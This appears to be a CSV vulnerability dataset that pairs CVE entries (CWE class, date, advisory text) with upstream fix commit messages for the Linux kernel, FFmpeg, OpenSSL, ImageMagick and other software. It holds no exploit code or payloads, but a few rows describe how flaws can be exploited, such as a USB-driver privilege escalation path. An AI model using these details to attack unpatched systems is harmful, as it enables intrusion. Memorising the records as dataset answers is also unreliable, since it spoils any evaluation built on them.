CVE-2014-7145,CWE-399,2014-09-28,The SMB2_tcon function in fs/cifs/smb2pdu.c in the Linux kernel before 3.16.3 allows remote CIFS servers to cause a denial of service (NULL pointer dereference and client system crash) or possibly have unspecified other impact by deleting the IPC$ share during resolution of DFS referrals.,"As Raphael Geissert pointed out, tcon_error_exit can dereference tcon and there is one path in which tcon can be null.  Signed-off-by: Steve French <smfrench@gmail.com> CC: Stable <stable@vger.kernel.org> # v3.7+ Reported-by: Raphael Geissert <geissert@debian.org>"
CVE-2016-10191,CWE-119,2017-02-09,"Heap-based buffer overflow in libavformat/rtmppkt.c in FFmpeg before 2.8.10, 3.0.x before 3.0.5, 3.1.x before 3.1.6, and 3.2.x before 3.2.2 allows remote attackers to execute arbitrary code by leveraging failure to check for RTMP packet size mismatches.",Fixes out of array access  Found-by: Paul Cher <paulcher@icloud.com> Reviewed-by: Paul Cher <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2015-2831,CWE-119,2015-04-14,Buffer overflow in das_watchdog 0.9.0 allows local users to execute arbitrary code with root privileges via a large string in the XAUTHORITY environment variable.,
CVE-2014-9710,CWE-362,2015-05-27,"The Btrfs implementation in the Linux kernel before 3.19 does not ensure that the visible xattr state is consistent with a requested replacement, which allows local users to bypass intended ACL settings and gain privileges via standard filesystem operations (1) during an xattr-replacement time window, related to a race condition, or (2) after an xattr-replacement attempt that fails because the data does not fit.","Replacing a xattr consists of doing a lookup for its existing value, delete the current value from the respective leaf, release the search path and then finally insert the new value. This leaves a time window where readers (getxattr, listxattrs) won't see any value for the xattr. Xattrs are used to store ACLs, so this has security implications.  This change also fixes 2 other existing issues which were:  *) Deleting the old xattr value without verifying first if the new xattr will    fit in the existing leaf item (in case multiple xattrs are packed in the    same item due to name hash collision);  *) Returning -EEXIST when the flag XATTR_CREATE is given and the xattr doesn't    exist but we have have an existing item that packs muliple xattrs with    the same name hash as the input xattr. In this case we should return ENOSPC.  A test case for xfstests follows soon.  Thanks to Alexandre Oliva for reporting the non-atomicity of the xattr replace implementation.  Reported-by: Alexandre Oliva <oliva@gnu.org> Signed-off-by: Filipe Manana <fdmanana@suse.com> Signed-off-by: Chris Mason <clm@fb.com>"
CVE-2015-0209,,2015-03-19,"Use-after-free vulnerability in the d2i_ECPrivateKey function in crypto/ec/ec_asn1.c in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a might allow remote attackers to cause a denial of service (memory corruption and application crash) or possibly have unspecified other impact via a malformed Elliptic Curve (EC) private-key file that is improperly handled during import.",
CVE-2017-8066,CWE-119,2017-04-23,"drivers/net/can/usb/gs_usb.c in the Linux kernel 4.9.x and 4.10.x before 4.10.2 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","Fixes: 05ca527 can: gs_usb: add ethtool set_phys_id callback to locate physical device  The gs_usb driver is performing USB transfers using buffers allocated on the stack. This causes the driver to not function with vmapped stacks. Instead, allocate memory for the transfer buffers.  Signed-off-by: Ethan Zonca <e@ethanzonca.com> Cc: linux-stable <stable@vger.kernel.org> # >= v4.8 Signed-off-by: Marc Kleine-Budde <mkl@pengutronix.de>"
CVE-2016-3713,CWE-284,2016-06-27,"The msr_mtrr_valid function in arch/x86/kvm/mtrr.c in the Linux kernel before 4.6.1 supports MSR 0x2f8, which allows guest OS users to read or write to the kvm_arch_vcpu data structure, and consequently obtain sensitive information or cause a denial of service (system crash), via a crafted ioctl call.","MSR 0x2f8 accessed the 124th Variable Range MTRR ever since MTRR support was introduced by 9ba075a (""KVM: MTRR support"").  0x2f8 became harmful when 910a6aa (""KVM: MTRR: exactly define the size of variable MTRRs"") shrinked the array of VR MTRRs from 256 to 8, which made access to index 124 out of bounds.  The surrounding code only WARNs in this situation, thus the guest gained a limited read/write access to struct kvm_arch_vcpu.  0x2f8 is not a valid VR MTRR MSR, because KVM has/advertises only 16 VR MTRR MSRs, 0x200-0x20f.  Every VR MTRR is set up using two MSRs, 0x2f8 was treated as a PHYSBASE and 0x2f9 would be its PHYSMASK, but 0x2f9 was not implemented in KVM, therefore 0x2f8 could never do anything useful and getting rid of it is safe.  This fixes CVE-2016-3713.  Fixes: 910a6aa (""KVM: MTRR: exactly define the size of variable MTRRs"") Cc: stable@vger.kernel.org Reported-by: David Matlack <dmatlack@google.com> Signed-off-by: Andy Honig <ahonig@google.com> Signed-off-by: Radim Krčmář <rkrcmar@redhat.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2016-2177,CWE-190,2016-06-20,"OpenSSL through 1.0.2h incorrectly uses pointer arithmetic for heap-buffer boundary checks, which might allow remote attackers to cause a denial of service (integer overflow and application crash) or possibly have unspecified other impact by leveraging unexpected malloc behavior, related to s3_srvr.c, ssl_sess.c, and t1_lib.c.",
CVE-2017-9059,CWE-404,2017-05-18,"The NFSv4 implementation in the Linux kernel through 4.11.1 allows local users to cause a denial of service (resource consumption) by leveraging improper channel callback shutdown when unmounting an NFSv4 filesystem, aka a ""module reference and kernel daemon"" leak.","Pull nfsd updates from Bruce Fields:  ""Another RDMA update from Chuck Lever, and a bunch of miscellaneous   bugfixes""  * tag 'nfsd-4.12' of git://linux-nfs.org/~bfields/linux: (26 commits)   nfsd: Fix up the ""supattr_exclcreat"" attributes   nfsd: encoders mustn't use unitialized values in error cases   nfsd: fix undefined behavior in nfsd4_layout_verify   lockd: fix lockd shutdown race   NFSv4: Fix callback server shutdown   SUNRPC: Refactor svc_set_num_threads()   NFSv4.x/callback: Create the callback service through svc_create_pooled   lockd: remove redundant check on block   svcrdma: Clean out old XDR encoders   svcrdma: Remove the req_map cache   svcrdma: Remove unused RDMA Write completion handler   svcrdma: Reduce size of sge array in struct svc_rdma_op_ctxt   svcrdma: Clean up RPC-over-RDMA backchannel reply processing   svcrdma: Report Write/Reply chunk overruns   svcrdma: Clean up RDMA_ERROR path   svcrdma: Use rdma_rw API in RPC reply path   svcrdma: Introduce local rdma_rw API helpers   svcrdma: Clean up svc_rdma_get_inv_rkey()   svcrdma: Add helper to save pages under I/O   svcrdma: Eliminate RPCRDMA_SQ_DEPTH_MULT   ..."
CVE-2017-6345,CWE-20,2017-03-01,"The LLC subsystem in the Linux kernel before 4.9.13 does not ensure that a certain destructor exists in required circumstances, which allows local users to cause a denial of service (BUG_ON) or possibly have unspecified other impact via crafted system calls.","It seems nobody used LLC since linux-3.12.  Fortunately fuzzers like syzkaller still know how to run this code, otherwise it would be no fun.  Setting skb->sk without skb->destructor leads to all kinds of bugs, we now prefer to be very strict about it.  Ideally here we would use skb_set_owner() but this helper does not exist yet, only CAN seems to have a private helper for that.  Fixes: 376c731 (""net: add a temporary sanity check in skb_orphan()"") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-3228,CWE-189,2015-08-11,"Integer overflow in the gs_heap_alloc_bytes function in base/gsmalloc.c in Ghostscript 9.15 and earlier allows remote attackers to cause a denial of service (crash) via a crafted Postscript (ps) file, as demonstrated by using the ps2pdf command, which triggers an out-of-bounds read or write.",
CVE-2016-7514,CWE-125,2017-04-20,The ReadPSDChannelPixels function in coders/psd.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted PSD file.,
CVE-2018-8754,CWE-125,2018-03-18,"The libevt_record_values_read_event() function in libevt_record_values.c in libevt before 2018-03-17 does not properly check for out-of-bounds values of user SID data size, strings size, or data size. NOTE: the vendor has disputed this as described in libyal/libevt issue 5 on GitHub",
CVE-2011-0716,CWE-399,2012-06-21,"The br_multicast_add_group function in net/bridge/br_multicast.c in the Linux kernel before 2.6.38, when a certain Ethernet bridge configuration is used, allows local users to cause a denial of service (memory corruption and system crash) by sending IGMP packets to a local interface.","The list mp->mglist is used to indicate whether a multicast group is active on the bridge interface itself as opposed to one of the constituent interfaces in the bridge.  Unfortunately the operation that adds the mp->mglist node to the list neglected to check whether it has already been added.  This leads to list corruption in the form of nodes pointing to itself.  Normally this would be quite obvious as it would cause an infinite loop when walking the list.  However, as this list is never actually walked (which means that we don't really need it, I'll get rid of it in a subsequent patch), this instead is hidden until we perform a delete operation on the affected nodes.  As the same node may now be pointed to by more than one node, the delete operations can then cause modification of freed memory.  This was observed in practice to cause corruption in 512-byte slabs, most commonly leading to crashes in jbd2.  Thanks to Josef Bacik for pointing me in the right direction.  Reported-by: Ian Page Hands <ihands@redhat.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2014-9731,CWE-17,2015-08-31,"The UDF filesystem implementation in the Linux kernel before 3.18.2 does not ensure that space is available for storing a symlink target's name along with a trailing \0 character, which allows local users to obtain sensitive information via a crafted filesystem image, related to fs/udf/symlink.c and fs/udf/unicode.c.",Symlink reading code does not check whether the resulting path fits into the page provided by the generic code. This isn't as easy as just checking the symlink size because of various encoding conversions we perform on path. So we have to check whether there is still enough space in the buffer on the fly.  CC: stable@vger.kernel.org Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no> Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2013-4514,CWE-119,2013-11-12,"Multiple buffer overflows in drivers/staging/wlags49_h2/wl_priv.c in the Linux kernel before 3.12 allow local users to cause a denial of service or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability and providing a long station-name string, related to the (1) wvlan_uil_put_info and (2) wvlan_set_station_nickname functions.",We need to check the length parameter before doing the memcpy().  I've actually changed it to strlcpy() as well so that it's NUL terminated.  You need CAP_NET_ADMIN to trigger these so it's not the end of the world.  Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2016-7912,CWE-416,2016-11-16,Use-after-free vulnerability in the ffs_user_copy_worker function in drivers/usb/gadget/function/f_fs.c in the Linux kernel before 4.5.3 allows local users to gain privileges by accessing an I/O data structure after a certain callback call.,"When using asynchronous read or write operations on the USB endpoints the issuer of the IO request is notified by calling the ki_complete() callback of the submitted kiocb when the URB has been completed.  Calling this ki_complete() callback will free kiocb. Make sure that the structure is no longer accessed beyond that point, otherwise undefined behaviour might occur.  Fixes: 2e4c755 (""usb: gadget: f_fs: add aio support"") Cc: <stable@vger.kernel.org> # v3.15+ Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Signed-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>"
CVE-2018-12896,CWE-190,2018-07-02,"An issue was discovered in the Linux kernel through 4.17.3. An Integer Overflow in kernel/time/posix-timers.c in the POSIX timer code is caused by the way the overrun accounting works. Depending on interval and expiry time values, the overrun can be larger than INT_MAX, but the accounting is int based. This basically makes the accounting values, which are visible to user space via timer_getoverrun(2) and siginfo::si_overrun, random. For example, a local user can cause a denial of service (signed integer overflow) via crafted mmap, futex, timer_create, and timer_settime system calls.","The posix timer overrun handling is broken because the forwarding functions can return a huge number of overruns which does not fit in an int. As a consequence timer_getoverrun(2) and siginfo::si_overrun can turn into random number generators.  The k_clock::timer_forward() callbacks return a 64 bit value now. Make k_itimer::ti_overrun[_last] 64bit as well, so the kernel internal accounting is correct. 3Remove the temporary (int) casts.  Add a helper function which clamps the overrun value returned to user space via timer_getoverrun(2) or siginfo::si_overrun limited to a positive value between 0 and INT_MAX. INT_MAX is an indicator for user space that the overrun value has been clamped.  Reported-by: Team OWL337 <icytxw@gmail.com> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Acked-by: John Stultz <john.stultz@linaro.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Michael Kerrisk <mtk.manpages@gmail.com> Link: https://lkml.kernel.org/r/20180626132705.018623573@linutronix.de"
CVE-2014-4502,CWE-119,2014-07-23,"Multiple heap-based buffer overflows in the parse_notify function in sgminer before 4.2.2, cgminer before 4.3.5, and BFGMiner before 4.1.0 allow remote pool servers to have unspecified impact via a (1) large or (2) negative value in the Extranonc2_size parameter in a mining.subscribe response and a crafted mining.notify request.",Thanks to Mick Ayzenberg <mick@dejavusecurity.com> for finding this!
CVE-2017-15102,CWE-476,2017-11-15,The tower_probe function in drivers/usb/misc/legousbtower.c in the Linux kernel before 4.8.1 allows local users (who are physically proximate for inserting a crafted USB device) to gain privileges by leveraging a write-what-where condition that occurs after a race condition and a NULL pointer dereference.,"This patch fixes a NULL pointer dereference caused by a race codition in the probe function of the legousbtower driver. It re-structures the probe function to only register the interface after successfully reading the board's firmware ID.  The probe function does not deregister the usb interface after an error receiving the devices firmware ID. The device file registered (/dev/usb/legousbtower%d) may be read/written globally before the probe function returns. When tower_delete is called in the probe function (after an r/w has been initiated), core dev structures are deleted while the file operation functions are still running. If the 0 address is mappable on the machine, this vulnerability can be used to create a Local Priviege Escalation exploit via a write-what-where condition by remapping dev->interrupt_out_buffer in tower_write. A forged USB device and local program execution would be required for LPE. The USB device would have to delay the control message in tower_probe and accept the control urb in tower_open whilst guest code initiated a write to the device file as tower_delete is called from the error in tower_probe.  This bug has existed since 2003. Patch tested by emulated device.  Reported-by: James Patrick-Evans <james@jmp-e.com> Tested-by: James Patrick-Evans <james@jmp-e.com> Signed-off-by: James Patrick-Evans <james@jmp-e.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2018-15120,CWE-119,2018-08-24,"libpango in Pango 1.40.8 through 1.42.3, as used in hexchat and other products, allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via crafted text with invalid Unicode sequences.","Invalid Unicode sequences, such as 0x2665 0xfe0e 0xfe0f, can trick the Emoji iter code into returning an empty segment, which then triggers an assertion in the itemizer.  Prevent this by ensuring that we make progress.  This issue was reported by Jeffrey M."
CVE-2016-10269,CWE-125,2017-03-24,"LibTIFF 4.0.0alpha4, 4.0.0alpha5, 4.0.0alpha6, 4.0.0beta7, 4.0.0, 4.0.1, 4.0.2, 4.0.3, 4.0.4, 4.0.4beta, 4.0.5, 4.0.6 and 4.0.7 allows remote attackers to cause a denial of service (heap-based buffer over-read) or possibly have unspecified other impact via a crafted TIFF image, related to ""READ of size 512"" and libtiff/tif_unix.c:340:2.","overflow on generation of PixarLog / LUV compressed files, with ColorMap, TransferFunction attached and nasty plays with bitspersample. The fix for LUV has not been tested, but suffers from the same kind of issue of PixarLog. Reported by Agostino Sarubbo. Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2604"
CVE-2017-7616,CWE-388,2017-04-10,Incorrect error handling in the set_mempolicy and mbind compat syscalls in mm/mempolicy.c in the Linux kernel through 4.10.9 allows local users to obtain sensitive information from uninitialized stack data by triggering failure of a certain bitmap operation.,In the case that compat_get_bitmap fails we do not want to copy the bitmap to the user as it will contain uninitialized stack data and leak sensitive data.  Signed-off-by: Chris Salls <salls@cs.ucsb.edu> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2014-3564,CWE-119,2014-10-20,"Multiple heap-based buffer overflows in the status_handler function in (1) engine-gpgsm.c and (2) engine-uiserver.c in GPGME before 1.5.1 allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via vectors related to ""different line lengths in a specific order.""",
CVE-2017-12193,CWE-476,2017-11-22,"The assoc_array_insert_into_terminal_node function in lib/assoc_array.c in the Linux kernel before 4.13.11 mishandles node splitting, which allows local users to cause a denial of service (NULL pointer dereference and panic) via a crafted application, as demonstrated by the keyring key type, and key addition and link creation operations.","This fixes CVE-2017-12193.  Fix a case in the assoc_array implementation in which a new leaf is added that needs to go into a node that happens to be full, where the existing leaves in that node cluster together at that level to the exclusion of new leaf.  What needs to happen is that the existing leaves get moved out to a new node, N1, at level + 1 and the existing node needs replacing with one, N0, that has pointers to the new leaf and to N1.  The code that tries to do this gets this wrong in two ways:   (1) The pointer that should've pointed from N0 to N1 is set to point      recursively to N0 instead.   (2) The backpointer from N0 needs to be set correctly in the case N0 is      either the root node or reached through a shortcut.  Fix this by removing this path and using the split_node path instead, which achieves the same end, but in a more general way (thanks to Eric Biggers for spotting the redundancy).  The problem manifests itself as:    BUG: unable to handle kernel NULL pointer dereference at 0000000000000010   IP: assoc_array_apply_edit+0x59/0xe5  Fixes: 3cb9895 (""Add a generic associative array implementation."") Reported-and-tested-by: WU Fan <u3536072@connect.hku.hk> Signed-off-by: David Howells <dhowells@redhat.com> Cc: stable@vger.kernel.org [v3.13-rc1+] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-9253,CWE-400,2018-02-19,"An issue was discovered in PHP 7.3.x before 7.3.0alpha3, 7.2.x before 7.2.8, and before 7.1.20. The php-fpm master process restarts a child process in an endless loop when using program execution functions (e.g., passthru, exec, shell_exec, or system) with a non-blocking STDIN stream, causing this master process to consume 100% of the CPU, and consume disk space with a large volume of error logs, as demonstrated by an attack by a customer of a shared-hosting facility.","Directly listen on socket, instead of duping it to STDIN and listening on that."
CVE-2013-2234,CWE-119,2013-07-04,"The (1) key_notify_sa_flush and (2) key_notify_policy_flush functions in net/key/af_key.c in the Linux kernel before 3.10 do not initialize certain structure members, which allows local users to obtain sensitive information from kernel heap memory by reading a broadcast message from the notify interface of an IPSec key_socket.","key_notify_sa_flush() and key_notify_policy_flush() miss to initialize the sadb_msg_reserved member of the broadcasted message and thereby leak 2 bytes of heap memory to listeners. Fix that.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Steffen Klassert <steffen.klassert@secunet.com> Cc: ""David S. Miller"" <davem@davemloft.net> Cc: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-15822,CWE-617,2018-08-23,"The flv_write_packet function in libavformat/flvenc.c in FFmpeg through 2.8 does not check for an empty audio packet, leading to an assertion failure.",Fixes: Assertion failure Fixes: assert_flvenc.c:941_1.swf  Found-by: #CHEN HONGXU# <HCHEN017@e.ntu.edu.sg> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc> (cherry picked from commit 6b67d7f) Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2018-11469,CWE-200,2018-05-25,"Incorrect caching of responses to requests including an Authorization header in HAProxy 1.8.0 through 1.8.9 (if cache enabled) allows attackers to achieve information disclosure via an unauthenticated remote request, related to the proto_http.c check_request_for_cacheability function.",
CVE-2012-2123,CWE-264,2012-05-17,"The cap_bprm_set_creds function in security/commoncap.c in the Linux kernel before 3.3.3 does not properly handle the use of file system capabilities (aka fcaps) for implementing a privileged executable file, which allows local users to bypass intended personality restrictions via a crafted application, as demonstrated by an attack that uses a parent process to disable ASLR.",If a process increases permissions using fcaps all of the dangerous personality flags which are cleared for suid apps should also be cleared. Thus programs given priviledge with fcaps will continue to have address space randomization enabled even if the parent tried to disable it to make it easier to attack.  Signed-off-by: Eric Paris <eparis@redhat.com> Reviewed-by: Serge Hallyn <serge.hallyn@canonical.com> Signed-off-by: James Morris <james.l.morris@oracle.com>
CVE-2016-9934,CWE-476,2017-01-04,"ext/wddx/wddx.c in PHP before 5.6.28 and 7.x before 7.0.13 allows remote attackers to cause a denial of service (NULL pointer dereference) via crafted serialized data in a wddxPacket XML document, as demonstrated by a PDORow string.","Proper soltion would be to call serialize/unserialize and deal with the result, but this requires more work that should be done by wddx maintainer (not me)."
CVE-2018-12249,CWE-476,2018-06-12,"An issue was discovered in mruby 1.4.1. There is a NULL pointer dereference in mrb_class_real because ""class BasicObject"" is not properly supported in class.c.",
CVE-2019-11884,,2019-05-10,"The do_hidp_sock_ioctl function in net/bluetooth/hidp/sock.c in the Linux kernel before 5.0.15 allows a local user to obtain potentially sensitive information from kernel stack memory via a HIDPCONNADD command, because a name field may not end with a '\0' character.","Struct ca is copied from userspace. It is not checked whether the ""name"" field is NULL terminated, which allows local users to obtain potentially sensitive information from kernel stack memory, via a HIDPCONNADD command.  This vulnerability is similar to CVE-2011-1079.  Signed-off-by: Young Xiao <YangX92@hotmail.com> Signed-off-by: Marcel Holtmann <marcel@holtmann.org> Cc: stable@vger.kernel.org"
CVE-2017-5510,CWE-787,2017-03-24,"coders/psd.c in ImageMagick allows remote attackers to have unspecified impact via a crafted PSD file, which triggers an out-of-bounds write.",
CVE-2019-12098,,2019-05-15,"In the client side of Heimdal before 7.6.0, failure to verify anonymous PKINIT PA-PKINIT-KX key exchange permits a man-in-the-middle attack. This issue is in krb5_init_creds_step in lib/krb5/init_creds_pw.c.",RFC8062 Section 7 requires verification of the PA-PKINIT-KX key excahnge when anonymous PKINIT is used.  Failure to do so can permit an active attacker to become a man-in-the-middle.  Introduced by a1ef548.  First tagged release Heimdal 1.4.0.  CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N (4.8)  Change-Id: I6cc1c0c24985936468af08693839ac6c3edda133 Signed-off-by: Jeffrey Altman <jaltman@auristor.com> Approved-by: Jeffrey Altman <jaltman@auritor.com> (cherry picked from commit 38c797e)
CVE-2016-8687,CWE-119,2017-02-15,Stack-based buffer overflow in the safe_fprintf function in tar/util.c in libarchive 3.2.1 allows remote attackers to cause a denial of service via a crafted non-printable multibyte character in a filename.,"The safe_fprintf function attempts to ensure clean output for an arbitrary sequence of bytes by doing a trial conversion of the multibyte characters to wide characters -- if the resulting wide character is printable then we pass through the corresponding bytes unaltered, otherwise, we convert them to C-style ASCII escapes.  The stack trace in Issue #767 suggest that the 20-byte buffer was getting overflowed trying to format a non-printable multibyte character.  This should only happen if there is a valid multibyte character of more than 5 bytes that was unprintable.  (Each byte would get expanded to a four-charcter octal-style escape of the form ""\123"" resulting in >20 characters for the >5 byte multibyte character.)  I've not been able to reproduce this, but have expanded the conversion buffer to 128 bytes on the belief that no multibyte character set has a single character of more than 32 bytes."
CVE-2013-4592,CWE-399,2013-11-20,Memory leak in the __kvm_set_memory_region function in virt/kvm/kvm_main.c in the Linux kernel before 3.9 allows local users to cause a denial of service (memory consumption) by leveraging certain device access to trigger movement of memory slots.,The iommu integration into memory slots expects memory slots to be added or removed and doesn't handle the move case.  We can unmap slots from the iommu after we mark them invalid and map them before installing the final memslot array.  Also re-order the kmemdup vs map so we don't leave iommu mappings if we get ENOMEM.  Reviewed-by: Gleb Natapov <gleb@redhat.com> Signed-off-by: Alex Williamson <alex.williamson@redhat.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>
CVE-2014-3611,CWE-362,2014-11-10,Race condition in the __kvm_migrate_pit_timer function in arch/x86/kvm/i8254.c in the KVM subsystem in the Linux kernel through 3.17.2 allows guest OS users to cause a denial of service (host OS crash) by leveraging incorrect PIT emulation.,There's a race condition in the PIT emulation code in KVM.  In __kvm_migrate_pit_timer the pit_timer object is accessed without synchronization.  If the race condition occurs at the wrong time this can crash the host kernel.  This fixes CVE-2014-3611.  Cc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>
CVE-2017-11665,CWE-20,2017-07-27,The ff_amf_get_field_value function in libavformat/rtmppkt.c in FFmpeg 3.3.2 allows remote RTMP servers to cause a denial of service (Segmentation Violation and application crash) via a crafted stream.,Fixes: out of array accesses  Found-by: JunDong Xie of Ant-financial Light-Year Security Lab Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2013-7281,CWE-200,2014-01-08,"The dgram_recvmsg function in net/ieee802154/dgram.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel stack memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","Only update *addr_len when we actually fill in sockaddr, otherwise we can return uninitialized memory from the stack to the caller in the recvfrom, recvmmsg and recvmsg syscalls. Drop the the (addr_len == NULL) checks because we only get called with a valid addr_len pointer either from sock_common_recvmsg or inet_recvmsg.  If a blocking read waits on a socket which is concurrently shut down we now return zero and set msg_msgnamelen to 0.  Reported-by: mpb <mpb.mail@gmail.com> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-14056,CWE-834,2017-08-31,"In libavformat/rl2.c in FFmpeg 3.3.3, a DoS in rl2_read_header() due to lack of an EOF (End of File) check might cause huge CPU and memory consumption. When a crafted RL2 file, which claims a large ""frame_count"" field in the header but does not contain sufficient backing data, is provided, the loops (for offset and size tables) would consume huge CPU and memory resources, since there is no EOF check inside these loops.",Fixes: loop.rl2  Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2015-4054,CWE-476,2017-05-23,PgBouncer before 1.5.5 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) by sending a password packet before a startup packet.,Fixes a crash if password packet appears before startup packet (#42).
CVE-2018-19842,CWE-125,2018-12-04,"getToken in libr/asm/p/asm_x86_nz.c in radare2 before 3.1.0 allows attackers to cause a denial of service (stack-based buffer over-read) via crafted x86 assembly data, as demonstrated by rasm2.",
CVE-2016-8630,CWE-284,2016-11-28,"The x86_decode_insn function in arch/x86/kvm/emulate.c in the Linux kernel before 4.8.7, when KVM is enabled, allows local users to cause a denial of service (host OS crash) via a certain use of a ModR/M byte in an undefined instruction.","Commit 41061cd (""KVM: emulate: do not initialize memopp"") removes a check for non-NULL under incorrect assumptions. An undefined instruction with a ModR/M byte with Mod=0 and R/M-5 (e.g. 0xc7 0x15) will attempt to dereference a null pointer here.  Fixes: 41061cd Message-Id: <1477592752-126650-2-git-send-email-osh@google.com> Signed-off-by: Owen Hofmann <osh@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2017-12998,CWE-125,2017-09-14,The IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isis_print_extd_ip_reach().,Probably a copy-and-pasteo.  This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s).
CVE-2017-14169,CWE-20,2017-09-07,"In the mxf_read_primer_pack function in libavformat/mxfdec.c in FFmpeg 3.3.3 -> 2.4, an integer signedness error might occur when a crafted file, which claims a large ""item_num"" field such as 0xffffffff, is provided. As a result, the variable ""item_num"" turns negative, bypassing the check for a large value.","Fixes: 20170829B.mxf  Co-Author: 张洪亮(望初)"" <wangchu.zhl@alibaba-inc.com> Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2016-6302,CWE-20,2016-09-16,"The tls_decrypt_ticket function in ssl/t1_lib.c in OpenSSL before 1.1.0 does not consider the HMAC size during validation of the ticket length, which allows remote attackers to cause a denial of service via a ticket that is too short.",
CVE-2015-5195,CWE-20,2017-07-21,ntp_openssl.m4 in ntpd in NTP before 4.2.7p112 allows remote attackers to cause a denial of service (segmentation fault) via a crafted statistics or filegen configuration command that is not enabled during compilation.,[Bug 1774] Segfaults if cryptostats enabled and built without OpenSSL.
CVE-2018-6197,CWE-476,2018-01-25,w3m through 0.5.3 is prone to a NULL pointer dereference flaw in formUpdateBuffer in form.c.,Bug-Debian: #89
CVE-2014-3512,CWE-119,2014-08-13,"Multiple buffer overflows in crypto/srp/srp_lib.c in the SRP implementation in OpenSSL 1.0.1 before 1.0.1i allow remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via an invalid SRP (1) g, (2) A, or (3) B parameter.",
CVE-2016-7052,CWE-476,2016-09-26,crypto/x509/x509_vfy.c in OpenSSL 1.0.2i allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) by triggering a CRL operation.,
CVE-2019-11222,CWE-787,2019-04-15,gf_bin128_parse in utils/os_divers.c in GPAC 0.7.1 has a buffer overflow issue for the crypt feature when encountering a crafted_drm_file.xml file.,closes #1204 closes #1205
CVE-2015-9059,CWE-77,2017-05-28,picocom before 2.0 has a command injection vulnerability in the 'send and receive file' command because the command line is executed by /bin/sh unsafely.,"Picocom no longer uses /bin/sh to run external commands for file-transfer operations. Parsing the command line and spliting it into arguments is now performed internally by picocom, using quoting rules very similar to those of the Unix shell. Hopefully, this makes it impossible to inject shell-commands when supplying filenames or extra arguments to the send- and receive-file commands."
CVE-2016-7056,CWE-320,2018-09-10,A timing attack flaw was found in OpenSSL 1.0.1u and before that could allow a malicious user with local access to recover ECDSA P-256 private keys.,
CVE-2018-14359,CWE-120,2018-07-17,An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. They have a buffer overflow via base64 data.,"The obuf can be overflowed in auth_cram.c, and possibly auth_gss.c.  Thanks to Jeriko One for the bug report."
CVE-2014-9729,,2015-08-31,"The udf_read_inode function in fs/udf/inode.c in the Linux kernel before 3.18.2 does not ensure a certain data-structure size consistency, which allows local users to cause a denial of service (system crash) via a crafted UDF filesystem image.",Verify that inode size is sane when loading inode with data stored in ICB. Otherwise we may get confused later when working with the inode and inode size is too big.  CC: stable@vger.kernel.org Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no> Signed-off-by: Jan Kara <jack@suse.cz>
